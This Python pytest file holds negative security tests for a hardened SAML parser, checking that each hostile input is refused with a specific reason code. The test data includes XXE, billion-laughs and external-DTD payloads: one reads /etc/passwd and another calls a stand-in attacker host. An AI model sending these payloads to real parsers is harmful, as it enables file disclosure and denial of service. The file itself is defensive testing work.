"""Negative tests for the hardened parser (PRD FR-SAML-08, §11.4).

Every test here asserts a *specific* reason code. "It raised something" is not
evidence that the intended control fired.
"""

from __future__ import annotations

import pytest

from campusid.errors import ReasonCode, SamlRejected
from campusid.saml.parser import MAX_DOCUMENT_BYTES, parse_saml

pytestmark = pytest.mark.security


XXE_PAYLOAD = b"""<?xml version="1.0"?>
<!DOCTYPE Response [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ID="_r1">
  <Data>&xxe;</Data>
</samlp:Response>
"""

BILLION_LAUGHS = b"""<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ID="_r1">
  <Data>&lol4;</Data>
</samlp:Response>
"""

EXTERNAL_DTD = b"""<?xml version="1.0"?>
<!DOCTYPE Response SYSTEM "http://attacker.test/evil.dtd">
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ID="_r1"/>
"""


@pytest.mark.parametrize(
    ("name", "payload"),
    [
        ("xxe_file_disclosure", XXE_PAYLOAD),
        ("billion_laughs", BILLION_LAUGHS),
        ("external_dtd", EXTERNAL_DTD),
    ],
)
def test_doctype_bearing_documents_are_refused(name: str, payload: bytes) -> None:
    """Refusing the DOCTYPE removes the entire entity-attack class at once.

    Bounding expansion depth would be the alternative, and it is the approach
    that keeps producing CVEs.
    """
    with pytest.raises(SamlRejected) as exc:
        parse_saml(payload)

    assert exc.value.reason is ReasonCode.XML_HARDENING_VIOLATION


def test_oversized_payload_is_refused_before_parsing() -> None:
    oversized = b"<a>" + b"x" * MAX_DOCUMENT_BYTES + b"</a>"

    with pytest.raises(SamlRejected) as exc:
        parse_saml(oversized)

    assert exc.value.reason is ReasonCode.PAYLOAD_TOO_LARGE


def test_document_at_the_size_ceiling_is_accepted() -> None:
    """The boundary is inclusive; an off-by-one here rejects valid traffic."""
    filler = b"y" * (MAX_DOCUMENT_BYTES - len(b"<a></a>"))
    exactly_at_limit = b"<a>" + filler + b"</a>"
    assert len(exactly_at_limit) == MAX_DOCUMENT_BYTES

    assert parse_saml(exactly_at_limit).tag == "a"


def test_duplicate_ids_are_refused() -> None:
    """XML-DSig resolves `URI="#x"` by search. If two elements answer to the
    same ID, the verifier and the consumer can disagree about which one they
    mean — which is the whole XSW5 idea. Refuse the ambiguity."""
    payload = b"""<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                                  xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_dup">
                    <saml:Assertion ID="_dup"/>
                  </samlp:Response>"""

    with pytest.raises(SamlRejected) as exc:
        parse_saml(payload)

    assert exc.value.reason is ReasonCode.DUPLICATE_ELEMENT_ID


def test_malformed_xml_is_refused() -> None:
    with pytest.raises(SamlRejected) as exc:
        parse_saml(b"<samlp:Response><unclosed>")

    assert exc.value.reason is ReasonCode.MALFORMED_RESPONSE
